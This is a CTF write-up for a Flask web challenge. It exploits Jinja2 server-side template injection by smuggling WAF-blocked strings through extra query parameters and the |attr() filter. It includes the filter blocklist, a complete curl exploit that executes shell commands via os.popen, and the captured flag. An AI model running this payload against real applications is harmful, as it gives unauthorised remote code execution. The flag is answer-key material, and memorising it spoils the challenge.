---
title: "TemplateJail"
ctf: "CyberStrike CTF"
date: 2026-07-10
category: web
difficulty: medium
points: 250
flag_format: "cyberstrike{...}"
author: "retr0"
---

# TemplateJail

## Summary

A Flask greeting service renders the `name` parameter as a Jinja2 template, enabling SSTI. A WAF filters blocked substrings (`__`, `[`, `]`, `config`, `self`, `os.`, `eval`, `exec`, `open`, `read`, `globals`, `builtins`, `getattr`, etc.) but only inspects the `name` parameter. Smuggling blocked strings through other query parameters and dereferencing them via `request.args.*` + the `|attr()` filter bypasses the filter for full RCE.

## Solution

### Step 1: Confirm SSTI

`/greet?name={{7*7}}` renders `Hello, 49!`. The `name` value is passed straight into `render_template_string`, so it is server-side template injection. The WAF blacklist is shown on the page:

```
__  [  ]  config  self  import  os.  subprocess  eval  exec  open
read  write  file  builtins  globals  locals  getattr  setattr
```

### Step 2: Identify the bypass

The WAF only inspects the `name` parameter. Extra query parameters are passed through unfiltered, and `request` is available in the Jinja2 context. So any blocked string can be smuggled in another parameter and read back with `request.args.<key>`. Bracket indexing is blocked, but the `|attr()` filter (not in the blocklist) replaces `getattr`, and function-call parentheses `()` are allowed. The full chain becomes:

```
lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()
```

rewritten so every blocked token comes from `request.args`:

```
{{ lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)
       |attr(request.args.b)(request.args.d)(request.args.e)
       |attr(request.args.f)(request.args.g)|attr(request.args.h)() }}
```

### Step 3: Exploit

```bash
curl -s -G "http://chal.csc-snist.live:45256/greet" \
  --data-urlencode 'name={{ lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.b)(request.args.d)(request.args.e)|attr(request.args.f)(request.args.g)|attr(request.args.h)() }}' \
  --data-urlencode "a=__globals__" \
  --data-urlencode "b=__getitem__" \
  --data-urlencode "c=__builtins__" \
  --data-urlencode "d=__import__" \
  --data-urlencode "e=os" \
  --data-urlencode "f=popen" \
  --data-urlencode "g=cat /flag" \
  --data-urlencode "h=read" | grep -oP 'Hello, .*?!'
```

```
Hello, cyberstrike{b76538433f748b52ef2d9b602807efc6}!
```

## Flag

```
cyberstrike{b76538433f748b52ef2d9b602807efc6}
```
